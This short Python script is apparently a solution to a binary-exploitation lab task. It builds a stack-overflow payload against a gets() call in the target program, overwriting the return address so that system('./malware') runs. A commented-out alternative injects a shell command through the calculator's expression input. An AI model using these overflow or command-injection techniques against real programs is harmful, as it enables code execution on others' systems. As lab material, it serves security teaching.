#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
##利用 input() 中 gets() 的栈溢出，覆盖返回地址为 eval() 中"mov $0x6030d0,%edi; call system@plt" 的位置，从而执行 system("./malware")。
import struct
import sys

# 1) 命令字符串 + \x00 截断：让 strcpy 只把 "./malware" 拷进全局 command_buf
cmd = b"./malware\x00"

# 2) 补齐到 24 字节 = expression[16] + 保存的 rbp[8]
pad = b"\x00" * (24 - len(cmd))

# 3) 覆盖 input 的返回地址：0x401a6b = <eval+0x94>
#    401a6b: mov $0x6030d0,%edi
#    401a70: call 4017e0 <system@plt>
ret = struct.pack("<Q", 0x401A6B)

payload = cmd + pad + ret;

sys.stdout.buffer.write(payload)

##不利用栈溢出漏洞,直接用
##import sys
##payload = b"1));./malware #\n"
